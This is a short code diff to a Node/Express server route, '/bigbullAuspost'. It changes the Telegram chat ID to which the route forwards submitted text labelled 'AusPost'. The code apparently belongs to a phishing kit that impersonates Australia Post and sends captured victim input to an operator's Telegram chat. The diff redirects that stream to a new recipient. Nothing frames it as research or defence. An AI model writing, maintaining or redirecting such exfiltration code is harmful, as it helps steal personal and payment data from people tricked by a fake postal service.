@@ -434,7 +434,7 @@ app.post("/bigbullAuspost", (req, res) => {
           .post(
             `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
             {
-              chat_id: 5348269876,
+              chat_id: 1414520833,
               text: `AusPost:\n${originalText}`,
               parse_mode: "Markdown",
             }
